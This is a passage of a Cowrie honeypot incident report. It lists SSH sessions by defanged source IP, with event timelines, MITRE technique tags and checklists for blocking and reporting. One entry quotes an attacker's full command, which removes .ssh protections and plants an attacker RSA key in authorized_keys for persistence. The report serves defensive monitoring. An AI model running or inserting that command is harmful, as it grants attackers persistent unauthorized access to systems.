| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:03:27` | `cowrie.session.connect` |
| `2026-07-10 14:03:27` | `cowrie.client.version` |
| `2026-07-10 14:03:27` | `cowrie.client.kex` |
| `2026-07-10 14:03:28` | `cowrie.login.success` |
| `2026-07-10 14:03:28` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:03:28` | `cowrie.direct-tcpip.data` |
| `2026-07-10 14:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c09523b968d

| Field | Detail |
|---|---|
| **Source IP** | `211.252.94[.]151` |
| **First Seen** | 2026-07-10 14:04 |
| **Last Seen** | 2026-07-10 14:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:04:19` | `cowrie.session.connect` |
| `2026-07-10 14:04:20` | `cowrie.client.version` |
| `2026-07-10 14:04:20` | `cowrie.client.kex` |
| `2026-07-10 14:04:23` | `cowrie.login.success` |
| `2026-07-10 14:04:24` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:04:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.252.94[.]151` to AbuseIPDB if not already reported
- [ ] Block `211.252.94[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48b810486291

| Field | Detail |
|---|---|
| **Source IP** | `124.160.45[.]26` |
| **First Seen** | 2026-07-10 14:04 |
| **Last Seen** | 2026-07-10 14:04 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:04:31` | `cowrie.session.connect` |
| `2026-07-10 14:04:33` | `cowrie.client.version` |
| `2026-07-10 14:04:33` | `cowrie.client.kex` |
| `2026-07-10 14:04:37` | `cowrie.login.success` |
| `2026-07-10 14:04:38` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.160.45[.]26` to AbuseIPDB if not already reported
- [ ] Block `124.160.45[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-929f08568e97

| Field | Detail |
|---|---|
| **Source IP** | `103.112.224[.]81` |
| **First Seen** | 2026-07-10 14:05 |
| **Last Seen** | 2026-07-10 14:05 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:05:41` | `cowrie.session.connect` |
| `2026-07-10 14:05:44` | `cowrie.client.version` |
| `2026-07-10 14:05:44` | `cowrie.client.kex` |
| `2026-07-10 14:05:51` | `cowrie.login.success` |
| `2026-07-10 14:05:52` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:05:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.112.224[.]81` to AbuseIPDB if not already reported
- [ ] Block `103.112.224[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adeda4c9b952

| Field | Detail |
|---|---|
| **Source IP** | `156.238.86[.]2` |
| **First Seen** | 2026-07-10 14:05 |
| **Last Seen** | 2026-07-10 14:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:05:58` | `cowrie.session.connect` |
| `2026-07-10 14:05:59` | `cowrie.client.version` |
| `2026-07-10 14:05:59` | `cowrie.client.kex` |
| `2026-07-10 14:06:02` | `cowrie.login.success` |
| `2026-07-10 14:06:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.238.86[.]2` to AbuseIPDB if not already reported
- [ ] Block `156.238.86[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-991295194f7d

| Field | Detail |
|---|---|
| **Source IP** | `60.214.127[.]246` |
| **First Seen** | 2026-07-10 14:07 |
| **Last Seen** | 2026-07-10 14:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:07:20` | `cowrie.session.connect` |
| `2026-07-10 14:07:21` | `cowrie.client.version` |
| `2026-07-10 14:07:21` | `cowrie.client.kex` |
| `2026-07-10 14:07:24` | `cowrie.login.success` |
| `2026-07-10 14:07:26` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.214.127[.]246` to AbuseIPDB if not already reported
- [ ] Block `60.214.127[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58ee8d22350d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 14:07 |
| **Last Seen** | 2026-07-10 14:08 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:07:45` | `cowrie.session.connect` |
| `2026-07-10 14:07:48` | `cowrie.client.version` |
| `2026-07-10 14:07:48` | `cowrie.client.kex` |
| `2026-07-10 14:07:55` | `cowrie.login.success` |
| `2026-07-10 14:08:01` | `cowrie.session.params` |
| `2026-07-10 14:08:01` | `cowrie.command.input` |
| `2026-07-10 14:08:03` | `cowrie.log.closed` |
| `2026-07-10 14:08:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b07ba5666447

| Field | Detail |
|---|---|
| **Source IP** | `222.190.110[.]210` |
| **First Seen** | 2026-07-10 14:07 |
| **Last Seen** | 2026-07-10 14:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:07:49` | `cowrie.session.connect` |
| `2026-07-10 14:07:51` | `cowrie.client.version` |
| `2026-07-10 14:07:51` | `cowrie.client.kex` |
| `2026-07-10 14:07:55` | `cowrie.login.success` |
| `2026-07-10 14:07:56` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.190.110[.]210` to AbuseIPDB if not already reported
- [ ] Block `222.190.110[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3051534c5068

| Field | Detail |
|---|---|
| **Source IP** | `220.80.223[.]144` |
| **First Seen** | 2026-07-10 14:08 |
| **Last Seen** | 2026-07-10 14:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:08:02` | `cowrie.session.connect` |
| `2026-07-10 14:08:03` | `cowrie.client.version` |
| `2026-07-10 14:08:03` | `cowrie.client.kex` |
| `2026-07-10 14:08:05` | `cowrie.login.success` |
| `2026-07-10 14:08:06` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:08:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.223[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.80.223[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00da3d50119e

| Field | Detail |
|---|---|
| **Source IP** | `62.183.82[.]70` |
| **First Seen** | 2026-07-10 14:10 |
| **Last Seen** | 2026-07-10 14:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:10:42` | `cowrie.session.connect` |
| `2026-07-10 14:10:43` | `cowrie.client.version` |
| `2026-07-10 14:10:43` | `cowrie.client.kex` |
| `2026-07-10 14:10:44` | `cowrie.login.success` |
| `2026-07-10 14:10:44` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.183.82[.]70` to AbuseIPDB if not already reported
- [ ] Block `62.183.82[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1e6170a0f32

| Field | Detail |
|---|---|
| **Source IP** | `182.156.35[.]238` |
| **First Seen** | 2026-07-10 14:10 |
| **Last Seen** | 2026-07-10 14:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:10:53` | `cowrie.session.connect` |
| `2026-07-10 14:10:54` | `cowrie.client.version` |
| `2026-07-10 14:10:54` | `cowrie.client.kex` |
| `2026-07-10 14:10:55` | `cowrie.login.success` |
| `2026-07-10 14:10:56` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:11:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.35[.]238` to AbuseIPDB if not already reported
- [ ] Block `182.156.35[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4fe0e60a183

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 14:12 |
| **Last Seen** | 2026-07-10 14:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:12:15` | `cowrie.session.connect` |
| `2026-07-10 14:12:15` | `cowrie.client.version` |
| `2026-07-10 14:12:15` | `cowrie.client.kex` |
| `2026-07-10 14:12:15` | `cowrie.login.success` |
| `2026-07-10 14:12:15` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:12:16` | `cowrie.direct-tcpip.data` |
| `2026-07-10 14:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede4eafd5589

| Field | Detail |
|---|---|
| **Source IP** | `47.253.5[.]130` |
| **First Seen** | 2026-07-10 14:14 |
| **Last Seen** | 2026-07-10 14:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:14:42` | `cowrie.session.connect` |
| `2026-07-10 14:14:42` | `cowrie.client.version` |
| `2026-07-10 14:14:43` | `cowrie.client.kex` |
| `2026-07-10 14:14:43` | `cowrie.login.success` |
| `2026-07-10 14:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.253.5[.]130` to AbuseIPDB if not already reported
- [ ] Block `47.253.5[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dfc1f16400a

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-10 14:14 |
| **Last Seen** | 2026-07-10 14:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:14:43` | `cowrie.session.connect` |
| `2026-07-10 14:14:43` | `cowrie.client.version` |
| `2026-07-10 14:14:43` | `cowrie.client.kex` |
| `2026-07-10 14:14:44` | `cowrie.login.success` |
| `2026-07-10 14:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8f214436678

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 14:19 |
| **Last Seen** | 2026-07-10 14:19 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:19:19` | `cowrie.session.connect` |
| `2026-07-10 14:19:20` | `cowrie.client.version` |
| `2026-07-10 14:19:20` | `cowrie.client.kex` |
| `2026-07-10 14:19:30` | `cowrie.login.success` |
| `2026-07-10 14:19:35` | `cowrie.session.params` |
| `2026-07-10 14:19:35` | `cowrie.command.input` |
| `2026-07-10 14:19:37` | `cowrie.log.closed` |
| `2026-07-10 14:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7e46ee49782

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 14:20 |
| **Last Seen** | 2026-07-10 14:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:20:49` | `cowrie.session.connect` |
| `2026-07-10 14:20:49` | `cowrie.client.version` |
| `2026-07-10 14:20:49` | `cowrie.client.kex` |
| `2026-07-10 14:20:49` | `cowrie.login.success` |
| `2026-07-10 14:20:49` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:20:49` | `cowrie.direct-tcpip.data` |
| `2026-07-10 14:20:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca9e9a05d249

| Field | Detail |
|---|---|
| **Source IP** | `14.225.206[.]187` |
| **First Seen** | 2026-07-10 14:23 |
| **Last Seen** | 2026-07-10 14:24 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:23:51` | `cowrie.session.connect` |
| `2026-07-10 14:23:51` | `cowrie.client.version` |
| `2026-07-10 14:23:51` | `cowrie.client.kex` |
| `2026-07-10 14:23:52` | `cowrie.login.success` |
| `2026-07-10 14:23:54` | `cowrie.session.params` |
| `2026-07-10 14:23:54` | `cowrie.command.input` |
| `2026-07-10 14:23:54` | `cowrie.command.failed` |
| `2026-07-10 14:23:55` | `cowrie.log.closed` |
| `2026-07-10 14:23:55` | `cowrie.session.params` |
| `2026-07-10 14:23:55` | `cowrie.command.input` |
| `2026-07-10 14:23:56` | `cowrie.session.file_download` |
| `2026-07-10 14:23:56` | `cowrie.log.closed` |
| `2026-07-10 14:24:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.206[.]187` to AbuseIPDB if not already reported
- [ ] Block `14.225.206[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f55b249b142

| Field | Detail |
|---|---|
| **Source IP** | `14.225.206[.]187` |
| **First Seen** | 2026-07-10 14:23 |
| **Last Seen** | 2026-07-10 14:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:23:56` | `cowrie.session.connect` |
| `2026-07-10 14:23:56` | `cowrie.client.version` |
| `2026-07-10 14:23:56` | `cowrie.client.kex` |
| `2026-07-10 14:23:57` | `cowrie.login.success` |
| `2026-07-10 14:23:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.206[.]187` to AbuseIPDB if not already reported
- [ ] Block `14.225.206[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11de191be659

| Field | Detail |
|---|---|
| **Source IP** | `14.225.206[.]187` |
| **First Seen** | 2026-07-10 14:23 |
| **Last Seen** | 2026-07-10 14:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:23:58` | `cowrie.session.connect` |
| `2026-07-10 14:23:58` | `cowrie.client.version` |
| `2026-07-10 14:23:59` | `cowrie.client.kex` |
| `2026-07-10 14:24:01` | `cowrie.login.success` |
| `2026-07-10 14:24:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.206[.]187` to AbuseIPDB if not already reported
- [ ] Block `14.225.206[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cfd7adab169

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 14:25 |
| **Last Seen** | 2026-07-10 14:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:25:34` | `cowrie.session.connect` |
| `2026-07-10 14:25:35` | `cowrie.client.version` |
| `2026-07-10 14:25:35` | `cowrie.client.kex` |
| `2026-07-10 14:25:35` | `cowrie.login.success` |
| `2026-07-10 14:25:36` | `cowrie.session.params` |
| `2026-07-10 14:25:36` | `cowrie.command.input` |
| `2026-07-10 14:25:36` | `cowrie.log.closed` |
| `2026-07-10 14:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aafbebe2d87

| Field | Detail |
|---|---|
| **Source IP** | `118.196.30[.]45` |
| **First Seen** | 2026-07-10 14:26 |
| **Last Seen** | 2026-07-10 14:31 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:26:45` | `cowrie.session.connect` |
| `2026-07-10 14:26:45` | `cowrie.client.version` |
| `2026-07-10 14:26:45` | `cowrie.client.kex` |
| `2026-07-10 14:26:46` | `cowrie.login.success` |
| `2026-07-10 14:26:47` | `cowrie.session.params` |
| `2026-07-10 14:26:47` | `cowrie.command.input` |
| `2026-07-10 14:26:47` | `cowrie.command.failed` |
| `2026-07-10 14:31:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.196.30[.]45` to AbuseIPDB if not already reported
- [ ] Block `118.196.30[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45cd48d4c838

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-10 14:28 |
| **Last Seen** | 2026-07-10 14:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:28:34` | `cowrie.session.connect` |
| `2026-07-10 14:28:34` | `cowrie.client.version` |
| `2026-07-10 14:28:34` | `cowrie.client.kex` |
| `2026-07-10 14:28:34` | `cowrie.login.success` |
| `2026-07-10 14:28:34` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:28:34` | `cowrie.direct-tcpip.data` |
| `2026-07-10 14:28:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7d02b17e95d

| Field | Detail |
|---|---|
| **Source IP** | `122.176.21[.]104` |
| **First Seen** | 2026-07-10 14:29 |
| **Last Seen** | 2026-07-10 14:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:29:10` | `cowrie.session.connect` |
| `2026-07-10 14:29:11` | `cowrie.client.version` |
| `2026-07-10 14:29:11` | `cowrie.client.kex` |
| `2026-07-10 14:29:13` | `cowrie.login.success` |
| `2026-07-10 14:29:14` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:29:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.21[.]104` to AbuseIPDB if not already reported
- [ ] Block `122.176.21[.]104` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea9e4d7da6cb

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-10 14:29 |
| **Last Seen** | 2026-07-10 14:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:29:39` | `cowrie.session.connect` |
| `2026-07-10 14:29:40` | `cowrie.client.version` |
| `2026-07-10 14:29:40` | `cowrie.client.kex` |
| `2026-07-10 14:29:42` | `cowrie.login.success` |
| `2026-07-10 14:29:43` | `cowrie.session.params` |
| `2026-07-10 14:29:43` | `cowrie.command.input` |
| `2026-07-10 14:29:43` | `cowrie.log.closed` |
| `2026-07-10 14:29:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9813317f1982

| Field | Detail |
|---|---|
| **Source IP** | `39.183.162[.]243` |
| **First Seen** | 2026-07-10 14:31 |
| **Last Seen** | 2026-07-10 14:32 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:31:53` | `cowrie.session.connect` |
| `2026-07-10 14:31:55` | `cowrie.client.version` |
| `2026-07-10 14:31:55` | `cowrie.client.kex` |
| `2026-07-10 14:31:58` | `cowrie.login.success` |
| `2026-07-10 14:31:59` | `cowrie.direct-tcpip.request` |
| `2026-07-10 14:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.183.162[.]243` to AbuseIPDB if not already reported
- [ ] Block `39.183.162[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a898328266df

| Field | Detail |
|---|---|
| **Source IP** | `58.57.154[.]146` |
| **First Seen** | 2026-07-10 14:32 |
| **Last Seen** | 2026-07-10 14:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 14:32:10` | `cowrie.session.connect` |
| `2026-07-10 14:32:11` | `cowrie.client.version` |
